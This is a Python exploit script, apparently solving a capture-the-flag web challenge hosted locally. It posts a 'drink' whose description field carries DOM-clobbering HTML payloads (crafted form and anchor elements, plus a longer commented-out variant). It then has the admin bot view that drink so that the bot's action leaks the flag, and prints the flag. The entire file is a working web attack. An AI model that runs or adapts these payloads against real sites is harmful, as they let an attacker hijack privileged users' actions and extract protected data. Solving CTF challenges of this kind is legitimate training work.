import requests

data = {
    "name":"a",
    "flavor":"a",
    "description":"a"
}

# Create dummy drink
r = requests.post("http://127.0.0.1:50000/drinks",data=data)

flag_url= r.url
flag_id = flag_url[-64:]

data["description"] = f"<form id=id name=bottleId target={flag_id}></form><a id=id>"
#data["description"] = f"<form id=admin name=user><input id=admin name=admin></form><form name=requestStorageAccess id=id value=1></form><input id=id name=flavor maxLength=32 required></input><form id=id name=bottleId target={flag_id}></form><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a><a id=id></a>"

# Create drink with clobbered dom
r = requests.post("http://127.0.0.1:50000/drinks",data=data)
drinkid= r.url[-64:]

admin_data = {
    "drinkid":drinkid
}
r = requests.post("http://127.0.0.1:50000/admin",data=admin_data)

flagtext = requests.get(flag_url).text
print(flagtext[flagtext.find("SSM"):flagtext.find("}")+1])